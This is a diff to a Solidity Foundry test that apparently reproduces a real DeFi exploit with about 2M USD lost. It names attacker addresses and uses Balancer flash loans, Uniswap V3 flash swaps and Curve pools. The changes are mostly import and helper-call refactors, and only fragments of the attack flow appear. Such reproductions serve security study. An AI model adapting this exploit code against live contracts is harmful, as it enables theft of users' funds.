@@ -3,6 +3,15 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {ICurvePool} from "src/interfaces/ICurvePool.sol";
+
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+
+import {IUniswapV3Pair} from "src/interfaces/IUniswapV3Pair.sol";
+import {IBalancerVault} from "src/interfaces/IBalancerVault.sol";
+import {SafeERC20 as TransferHelper} from "src/interfaces/SafeERC20.sol";
 // @KeyInfo - Total Lost : ~2M USD$
 // Attacker : https://etherscan.io/address/0x5f4c21c9bb73c8b4a296cc256c0cde324db146df
 // Attack Contract : https://etherscan.io/address/0xa21a2b59d80dc42d332f778cbb9ea127100e5d75
@@ -48,7 +57,7 @@ contract ContractTest is Test {
     ICurvePool crvUSD_UZD_POOL = ICurvePool(0xfC636D819d1a98433402eC9dEC633d864014F28C);
     ICurvePool Curve3POOL = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
     ICurve ETH_SDT_POOL = ICurve(0xfB8814D005C5f32874391e888da6eB2fE7a27902);
-    IUniswapV2Router sushiRouter = IUniswapV2Router(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
+    IUniswapV2Router sushiRouter = IUniswapV2Router(payable(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F));
     IUniswapV3Pair USDC_WETH_Pair = IUniswapV3Pair(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
     IUniswapV3Pair USDC_USDT_Pair = IUniswapV3Pair(0x3416cF6C708Da44DB2624D63ea0AAef7113527C6);
     IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
@@ -92,7 +101,7 @@ contract ContractTest is Test {
         BalancerFlashLoan();
 
         uint256 amount = abi.decode(data, (uint256));
-        TransferHelper.safeTransfer(address(USDT), address(USDC_USDT_Pair), amount1 + amount);
+        TransferHelper.safeTransfer(USDT, address(USDC_USDT_Pair), amount1 + amount);
     }
 
     function BalancerFlashLoan() internal {
@@ -181,7 +190,7 @@ contract ContractTest is Test {
         USDC.approve(address(USDC_WETH_Pair), type(uint256).max);
         WETH.approve(address(sushiRouter), type(uint256).max);
         SDT.approve(address(sushiRouter), type(uint256).max);
-        TransferHelper.safeApprove(address(USDT), address(sushiRouter), type(uint256).max);
+        TransferHelper.safeIncreaseAllowance(USDT, address(sushiRouter), type(uint256).max);
         FRAX.approve(address(FRAX_USDC_POOL), type(uint256).max);
     }
 
